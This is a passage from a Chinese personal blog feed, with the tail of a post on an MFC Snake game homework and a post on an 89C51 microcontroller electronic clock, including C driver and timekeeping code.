    ASSERT_VALID(pDoc);
    CRect rectClient;
    GetClientRect(&amp;rectClient);
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span> &lt;= rectClient.left || pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span> &gt;= rectClient.right || pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> &lt;= rectClient.top || pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> &gt;= rectClient.bottom){
        KillTimer(<span class="number">1</span>);
        AfxMessageBox(<span class="string">"233"</span>);
        InvalidateRect(rectClient);
        pDoc-&gt;gameReset();
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].length &gt; <span class="number">3</span>){
        <span class="keyword">for</span>(<span class="keyword">int</span> temp = pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; temp &gt; <span class="number">0</span> ; temp--){
            <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span>==pDoc-&gt;snake[temp].body_x*<span class="number">20</span> &amp;&amp; pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> == pDoc-&gt;snake[temp].body_y*<span class="number">20</span>){
                KillTimer(<span class="number">1</span>);
                AfxMessageBox(<span class="string">"233"</span>);
                InvalidateRect(rectClient);
                pDoc-&gt;gameReset();
            }
        }
    }
    pDC-&gt;SelectStockObject(WHITE_PEN);
    pDC-&gt;Rectangle(pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_x*<span class="number">20</span>,pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_y*<span class="number">20</span>,(pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_x+<span class="number">1</span>)*<span class="number">20</span>,(pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_y+<span class="number">1</span>)*<span class="number">20</span>);
    <span class="keyword">for</span>(<span class="keyword">int</span> i=pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; i &gt; <span class="number">0</span> ; i--){
        pDoc-&gt;snake[i].body_x = pDoc-&gt;snake[i<span class="number">-1</span>].body_x;
        pDoc-&gt;snake[i].body_y = pDoc-&gt;snake[i<span class="number">-1</span>].body_y;
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction==<span class="number">1</span>){
        pDoc-&gt;snake[<span class="number">0</span>].body_y--;
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction==<span class="number">2</span>){
        pDoc-&gt;snake[<span class="number">0</span>].body_y++;
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction==<span class="number">3</span>){
        pDoc-&gt;snake[<span class="number">0</span>].body_x--;
    }
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].direction==<span class="number">4</span>){
        pDoc-&gt;snake[<span class="number">0</span>].body_x++;
    }
    pDC-&gt;SelectStockObject(BLACK_PEN);

    CBrush DrawBrush = (RGB(<span class="number">130</span>,<span class="number">130</span>,<span class="number">0</span>));
    CBrush *Drawbrush = pDC-&gt;SelectObject(&amp;DrawBrush);
    pDC-&gt;Rectangle(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span>,pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span>,(pDoc-&gt;snake[<span class="number">0</span>].body_x+<span class="number">1</span>)*<span class="number">20</span>,(pDoc-&gt;snake[<span class="number">0</span>].body_y+<span class="number">1</span>)*<span class="number">20</span>);
    pDC-&gt;SelectObject(DrawBrush);
    <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span> == pDoc-&gt;food.food_x*<span class="number">20</span> &amp;&amp; pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> == pDoc-&gt;food.food_y*<span class="number">20</span>)
    {
        pDoc-&gt;snake[<span class="number">0</span>].length++;
        pDoc-&gt;food.isfood = <span class="literal">true</span>;
        pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_x = pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-2</span>].body_x;
        pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>].body_y = pDoc-&gt;snake[pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-2</span>].body_y;
    }
    <span class="keyword">if</span>(pDoc-&gt;food.isfood == <span class="literal">true</span>)
    {
        srand((<span class="keyword">unsigned</span>)time(<span class="literal">NULL</span>));
        <span class="keyword">do</span>{
            <span class="keyword">for</span>(<span class="keyword">int</span> temp=pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; temp &gt;= <span class="number">0</span> ; temp--)
                <span class="keyword">if</span>(pDoc-&gt;snake[<span class="number">0</span>].body_x*<span class="number">20</span> == pDoc-&gt;snake[temp].body_x*<span class="number">20</span> &amp;&amp; pDoc-&gt;snake[<span class="number">0</span>].body_y*<span class="number">20</span> == pDoc-&gt;snake[temp].body_y*<span class="number">20</span>){
                    pDoc-&gt;food.food_x=rand()%<span class="number">25</span>;
                    pDoc-&gt;food.food_y=rand()%<span class="number">25</span>;
                    <span class="keyword">for</span>(temp=pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span> ; temp &gt;= <span class="number">0</span> ; temp--){
                        <span class="keyword">if</span>(pDoc-&gt;food.food_x*<span class="number">20</span> == pDoc-&gt;snake[temp].body_x*<span class="number">20</span> &amp;&amp; pDoc-&gt;food.food_y*<span class="number">20</span> == pDoc-&gt;snake[temp].body_y*<span class="number">20</span>){
                            temp = pDoc-&gt;snake[<span class="number">0</span>].length<span class="number">-1</span>;
                            pDoc-&gt;food.food_x=rand()%<span class="number">25</span>;
                            pDoc-&gt;food.food_y=rand()%<span class="number">25</span>;
                        }
                    }
                }
        }<span class="keyword">while</span>(pDoc-&gt;food.food_x*<span class="number">20</span> &lt; <span class="number">50</span> || pDoc-&gt;food.food_y*<span class="number">20</span> &lt; <span class="number">50</span> || pDoc-&gt;food.food_x*<span class="number">20</span> &gt; rectClient.right<span class="number">-100</span> || pDoc-&gt;food.food_y*<span class="number">20</span> &gt; rectClient.right<span class="number">-100</span>);
        pDC-&gt;Rectangle(pDoc-&gt;food.food_x*<span class="number">20</span>,pDoc-&gt;food.food_y*<span class="number">20</span>,(pDoc-&gt;food.food_x+<span class="number">1</span>)*<span class="number">20</span>,(pDoc-&gt;food.food_y+<span class="number">1</span>)*<span class="number">20</span>);
        pDoc-&gt;food.isfood = <span class="literal">false</span>;
    }
    CView::OnTimer(nIDEvent);
}
<span class="keyword">void</span> CSnakeView::OnLButtonDown(UINT nFlags, CPoint point) 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your message handler code here and/or call default    </span>
    CView::OnLButtonDown(nFlags, point);
}

<span class="keyword">void</span> CSnakeView::OnEasy() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">if</span>(pDoc-&gt;startFlag == <span class="literal">true</span>){
        SetTimer(<span class="number">1</span>,<span class="number">400</span>,<span class="literal">NULL</span>);
    }
}

<span class="keyword">void</span> CSnakeView::OnCrazy() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">if</span>(pDoc-&gt;startFlag == <span class="literal">true</span>){
        SetTimer(<span class="number">1</span>,<span class="number">100</span>,<span class="literal">NULL</span>);
    }
}

<span class="keyword">void</span> CSnakeView::OnHard() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">if</span>(pDoc-&gt;startFlag == <span class="literal">true</span>){
        SetTimer(<span class="number">1</span>,<span class="number">200</span>,<span class="literal">NULL</span>);
    }
}

<span class="keyword">void</span> CSnakeView::OnNormol() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    <span class="keyword">if</span>(pDoc-&gt;startFlag == <span class="literal">true</span>){
        SetTimer(<span class="number">1</span>,<span class="number">300</span>,<span class="literal">NULL</span>);
    }
}

<span class="keyword">void</span> CSnakeView::OnStart() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    CSnakeDoc* pDoc = GetDocument();
    ASSERT_VALID(pDoc);
    pDoc-&gt;startFlag = <span class="literal">true</span>;
    SetTimer(<span class="number">1</span>,<span class="number">300</span>,<span class="literal">NULL</span>); <span class="comment">//normal    </span>
}



<span class="keyword">void</span> CSnakeView::OnPause() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    KillTimer(<span class="number">1</span>);    
}



<span class="keyword">void</span> CSnakeView::OnStop() 
{
    <span class="comment">// <span class="doctag">TODO:</span> Add your command handler code here</span>
    AfxMessageBox(<span class="string">"Have a nice day!"</span>);
    ASSERT(AfxGetApp()-&gt;m_pMainWnd != <span class="literal">NULL</span>);
    AfxGetApp()-&gt;m_pMainWnd-&gt;SendMessage(WM_CLOSE);

}
</code></pre>
<p>让蛇动起来的方式是使用定时器，和以前我做过的卫星和小车大同小异。在这个程序中，蛇前进的方式是通过定时器计时，每过相同的时间，将蛇身部分的位置依次向前传递，用白色的画笔擦去蛇的最后一节。吃食物的时候把食物当成蛇新的头，同时数组长度增加1。  </p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这个程序比较繁琐……</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MFC的作业&quot;&gt;&lt;a href=&quot;#MFC的作业&quot; class=&quot;headerlink&quot; title=&quot;MFC的作业&quot;&gt;&lt;/a&gt;MFC的作业&lt;/h2&gt;&lt;h3 id=&quot;要求&quot;&gt;&lt;a href=&quot;#要求&quot; class=&quot;headerlink&quot; title=&quot;要求&quot;&gt;&lt;/a&gt;要求&lt;/h3&gt;&lt;p&gt;使用MFC的文本视图框架来写，实现贪吃蛇的基本功能：食物随机出现，键盘操作，蛇吃食物变长，蛇撞到边界和自己游戏结束，添加蛇身速度选择的按钮控件。&lt;br&gt;
    
    </summary>
    
      <category term="编程学习" scheme="https://hsmouc.com/categories/%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="C++" scheme="https://hsmouc.com/tags/C/"/>
    
      <category term="MFC" scheme="https://hsmouc.com/tags/MFC/"/>
    
  </entry>
  
  <entry>
    <title>基于89C51的电子时钟设计</title>
    <link href="https://hsmouc.com/2016/04/12/2016-04-12-clock/"/>
    <id>https://hsmouc.com/2016/04/12/2016-04-12-clock/</id>
    <published>2016-04-12T12:34:43.000Z</published>
    <updated>2016-10-22T15:40:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="电子系统设计实验课–电子钟"><a href="#电子系统设计实验课–电子钟" class="headerlink" title="电子系统设计实验课–电子钟"></a>电子系统设计实验课–电子钟</h2><p>代码是用C写的，写的很烂，基本没有考虑优化的问题。因为只有一个周的时间，我还要上蛋疼的雅思课，所以忽略函数的胡乱调用与变量的命名吧。<br>这个电子钟实现了如下功能:   </p>
<ul>
<li>时间的精确走动</li>
<li>时分秒年月日都可以通过键盘调节</li>
<li>秒表功能    </li>
</ul>
<p>做好的效果图是这样的：<br><img src="http://ww1.sinaimg.cn/large/005WMcFzjw1f2u9bwuytwj31kw16oax2.jpg" alt=""><br> <a id="more"></a> </p>
<h3 id="硬件设计"><a href="#硬件设计" class="headerlink" title="硬件设计"></a>硬件设计</h3><p>整体来说用了一块89C51，用hc165来读键盘的信息，hc164来将输入的串行数据转并行输出，送LCD显示。读键值的原理图如下:<br><img src="http://ww4.sinaimg.cn/large/005WMcFzjw1f2u8dwplkvj30jd0bctan.jpg" alt="">(乱码是什么鬼)<br>下面这张是hc164送显示的原理图:<br><img src="http://ww2.sinaimg.cn/large/005WMcFzjw1f2u8fxnfg7j30jz0bi40y.jpg" alt=""> (乱码又是什么鬼)</p>
<h3 id="软件设计"><a href="#软件设计" class="headerlink" title="软件设计"></a>软件设计</h3><p>大体上来说整个程序有两个部分:直接控制硬件的驱动层和我们实现电子钟功能的函数应用层。我们把它们分别放在DRI文件夹下和USR文件夹下。   </p>
<h4 id="驱动层设计"><a href="#驱动层设计" class="headerlink" title="驱动层设计"></a>驱动层设计</h4><p>(°_°)我要放源代码了:   </p>
<h5 id="hc165的底层控制代码"><a href="#hc165的底层控制代码" class="headerlink" title="hc165的底层控制代码"></a>hc165的底层控制代码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">sbit hc165_sdo=P1^5;</div><div class="line">sbit hc165_sclk=P1^6;</div><div class="line">sbit hc165_pl=P1^7;</div><div class="line"></div><div class="line">unsigned char key=0x3e;</div><div class="line"></div><div class="line">void hc165_init()&#123;</div><div class="line">	hc165_sdo=1;</div><div class="line">	hc165_sclk=0;</div><div class="line">	hc165_pl=1;</div><div class="line">&#125;</div><div class="line"></div><div class="line">unsigned char hc165_re(void)&#123;</div><div class="line">	unsigned i,x=0;</div><div class="line">	hc165_pl=0;</div><div class="line">	x=x+0;</div><div class="line">	hc165_pl=1;</div><div class="line">	if( hc165_sdo == 1 )</div><div class="line">		x = x + 1;</div><div class="line">	for( i = 0;i &lt; 7;i ++)&#123;</div><div class="line">		hc165_sclk=1;</div><div class="line">		x = x &lt;&lt; 1;</div><div class="line">		hc165_sclk=0;</div><div class="line">		if( hc165_sdo == 1 )</div><div class="line">			x = x + 1;</div><div class="line">	&#125;</div><div class="line">	return x;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="hc164-LCD显示的底层控制代码"><a href="#hc164-LCD显示的底层控制代码" class="headerlink" title="hc164(LCD显示的底层控制代码)"></a>hc164(LCD显示的底层控制代码)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;clock.h&gt;</div><div class="line">extern int data second[3];</div><div class="line">unsigned char timedisplay[14]=&#123;0,0,0,0,0,0,0,0,0,0,0,0,0,0&#125;;</div><div class="line">sbit LCD_E = P1^2;</div><div class="line">sbit LCD_RW = P1^1;</div><div class="line">sbit LCD_RS = P1^0;</div><div class="line">sbit HC164_SDAT = P1^3;</div><div class="line">sbit HC164_SCLK = P1^4;</div><div class="line">extern clockTypeDef clock;</div><div class="line">char position = 0;</div><div class="line">unsigned char flash = 0;</div><div class="line">unsigned char j = 0;</div><div class="line">unsigned char code ascii[]=&#123;&quot;0123456789&quot;&#125;;</div><div class="line">void send_data(unsigned char dat) &#123;</div><div class="line">	unsigned char i;</div><div class="line">	for(i = 0; i &lt; 8; i++)&#123;</div><div class="line">		HC164_SCLK = 0;</div><div class="line">		if(dat &amp; 0x80)&#123;</div><div class="line">			HC164_SDAT = 1;</div><div class="line">		&#125;</div><div class="line">		else&#123;</div><div class="line">			HC164_SDAT = 0;</div><div class="line">		&#125;</div><div class="line">		HC164_SCLK = 1;</div><div class="line">		dat = dat &lt;&lt; 1;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void Delay1ms(unsigned int c) &#123;</div><div class="line">	unsigned char a,b;</div><div class="line">	for(; c&gt;0; c--) &#123;</div><div class="line">		for(b = 199; b &gt; 0; b--) &#123;</div><div class="line">			for(a = 1; a &gt; 0; a--);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void LcdWrCmd(unsigned char com) &#123;</div><div class="line">	unsigned char x;</div><div class="line">	LCD_E = 0;</div><div class="line">	LCD_RS = 0;</div><div class="line">	LCD_RW = 0;</div><div class="line">	</div><div class="line">	send_data(com);</div><div class="line">	x++;</div><div class="line">	LCD_E = 1;</div><div class="line">	x++;</div><div class="line">	LCD_E = 0;</div><div class="line">	Delay1ms(1);</div><div class="line">&#125;</div><div class="line">void LcdWrData(unsigned char dat) &#123;</div><div class="line">	unsigned char x;</div><div class="line">	LCD_E = 0;</div><div class="line">	LCD_RS = 1;</div><div class="line">	LCD_RW = 0;</div><div class="line"></div><div class="line">	send_data(dat);</div><div class="line">	x++;</div><div class="line">	LCD_E = 1;</div><div class="line">	x++;</div><div class="line">	LCD_E = 0;</div><div class="line">	Delay1ms(1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void disp_line(unsigned char line) &#123;</div><div class="line">	if(line == 0)&#123;</div><div class="line">		LcdWrCmd(0x80 + 0x00);</div><div class="line">	&#125;</div><div class="line">	else&#123;</div><div class="line">		LcdWrCmd(0x80 + 0x40);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">void LcdInit()&#123;</div><div class="line">	LcdWrCmd(0x38);</div><div class="line">	LcdWrCmd(0x0c);</div><div class="line">	LcdWrCmd(0x06);</div><div class="line">	LcdWrCmd(0x01);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void second_display() &#123;</div><div class="line">	LcdWrCmd(0x01);</div><div class="line">	disp_line(0);</div><div class="line">	LcdWrData(ascii[second[0]/10]);</div><div class="line">	LcdWrData(ascii[second[0]%10]);</div><div class="line">	LcdWrData(0x27);</div><div class="line">	LcdWrData(ascii[second[1]/10]);</div><div class="line">	LcdWrData(ascii[second[1]%10]);</div><div class="line">	LcdWrData(&apos;&quot;&apos;);</div><div class="line">	LcdWrData(ascii[second[2]/10]);</div><div class="line">	LcdWrData(ascii[second[2]%10]);	</div><div class="line">&#125;</div><div class="line"></div><div class="line">void time_display()&#123;</div><div class="line">	unsigned char i;</div><div class="line">	timedisplay[0] = clock.Year/1000;</div><div class="line">	timedisplay[1] = clock.Year/100%10;</div><div class="line">	timedisplay[2] = clock.Year/10%10;</div><div class="line">	timedisplay[3] = clock.Year%10;</div><div class="line">	timedisplay[4] = clock.Month/10;</div><div class="line">	timedisplay[5] = clock.Month%10;</div><div class="line">	timedisplay[6] = clock.Day/10;</div><div class="line">	timedisplay[7] = clock.Day%10;</div><div class="line">	timedisplay[8] = clock.Hour/10;</div><div class="line">	timedisplay[9] = clock.Hour%10;</div><div class="line">	timedisplay[10] = clock.Minute/10;</div><div class="line">	timedisplay[11] = clock.Minute%10;</div><div class="line">	timedisplay[12] = clock.Second/10;</div><div class="line">	timedisplay[13] = clock.Second%10;</div><div class="line">	for(i = 0; i &lt; 14; i ++)&#123;</div><div class="line">		if(i == 0)</div><div class="line">			disp_line(0);</div><div class="line">		if((i == 4)||(i == 6))</div><div class="line">			LcdWrData(&apos;-&apos;);</div><div class="line">		if(i == 8)</div><div class="line">			disp_line(1);</div><div class="line">		if((i == 10)||(i == 12))</div><div class="line">			LcdWrData(&apos;:&apos;);</div><div class="line">		if((i == position)&amp;&amp;(flash == 1))&#123;</div><div class="line">			if(j &gt;= 25)&#123;</div><div class="line">				if(j &gt;= 50)&#123;</div><div class="line">					j = 0;</div><div class="line">				&#125;</div><div class="line">				LcdWrData(&apos; &apos;);</div><div class="line">			&#125;</div><div class="line">			else&#123;</div><div class="line">				LcdWrData(ascii[timedisplay[i]]);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">		else&#123;</div><div class="line">			LcdWrData(ascii[timedisplay[i]]);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<h4 id="用户层设计"><a href="#用户层设计" class="headerlink" title="用户层设计"></a>用户层设计</h4><p>用户层主要是一个计算时间的函数，时间的计算是通过定时器中断实现的，中断时间是10ms一次。因为我们添加了秒表功能。</p>
<h5 id="时间计算"><a href="#时间计算" class="headerlink" title="时间计算"></a>时间计算</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line">#include&lt;reg52.h&gt;</div><div class="line">#include&lt;clock.h&gt;</div><div class="line"></div><div class="line">int data time[6] = &#123;1970,1,1,0,0,0&#125;;</div><div class="line">int data second[3] =&#123;0,0,0&#125;;</div><div class="line">unsigned char timeMs10 = 0;</div><div class="line">unsigned char secMs10 = 0;</div><div class="line">clockTypeDef clock;</div><div class="line">void timeCalc(void)&#123;</div><div class="line">	timeMs10++;</div><div class="line">	if(timeMs10 == 100) &#123;</div><div class="line">		timeMs10 = 0;</div><div class="line">		time[5]++;</div><div class="line">		if(time[5] == 60) &#123;</div><div class="line">			time[4]++;</div><div class="line">			time[5] = 0;</div><div class="line">			if(time[4] == 60) &#123;</div><div class="line">				time[3]++;</div><div class="line">				time[4] = 0;</div><div class="line">				if(time[3] == 24) &#123;</div><div class="line">					time[2]++;</div><div class="line">					time[3] = 0;</div><div class="line">					if(time[1] == 1 || time[1] == 3 || time[1] == 5 || time[1] == 7 || time[1] == 8 || time[1] == 10 || time[1] == 12) &#123;</div><div class="line">						if(time[2] == 31) &#123;</div><div class="line">							time[1]++;</div><div class="line">							time[2] = 0;</div><div class="line">							if(time[1] == 12) &#123;</div><div class="line">								time[0]++;</div><div class="line">							&#125;</div><div class="line">						&#125;	</div><div class="line">					&#125;</div><div class="line">					if(time[1] == 4 || time[1] == 6 || time[1] == 9 || time[1] == 11) &#123;</div><div class="line">						if(time[2] == 30) &#123;</div><div class="line">							time[1]++;</div><div class="line">							time[2] = 0;</div><div class="line">						&#125;</div><div class="line">					&#125;</div><div class="line">					if(time[1] &gt;= 2) &#123;</div><div class="line">						if(time[0]%4 == 0) &#123;</div><div class="line">							if(time[2] == 29) &#123;</div><div class="line">								time[1]++;</div><div class="line">								time[2] = 0;</div><div class="line">							&#125;</div><div class="line">						&#125;</div><div class="line">						else</div><div class="line">							if(time[2] == 28) &#123;</div><div class="line">								time[1]++;</div><div class="line">								time[2] = 0;</div><div class="line">							&#125;</div><div class="line">					&#125;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125; 		</div><div class="line">	&#125;</div><div class="line">	clock.Year = time[0];</div><div class="line">	clock.Month = time[1];</div><div class="line">	clock.Day = time[2];</div><div class="line">	clock.Hour = time[3];</div><div class="line">	clock.Minute = time[4];</div><div class="line">	clock.Second = time[5];					</div><div class="line">&#125;</div><div class="line"></div><div class="line">void secondCalc(void) &#123;</div><div class="line">	secMs10++;</div><div class="line">	if(secMs10 == 1) &#123;</div><div class="line">		second[2] += 1;</div><div class="line">		secMs10 = 0;</div><div class="line">		if(second[2] == 99) &#123;</div><div class="line">			second[2] = 0;</div><div class="line">			second[1]++;</div><div class="line">			if(second[1] == 60) &#123;</div><div class="line">				second[1] = 0;</div><div class="line">				second[0]++;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">		</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="键盘处理"><a href="#键盘处理" class="headerlink" title="键盘处理"></a>键盘处理</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div 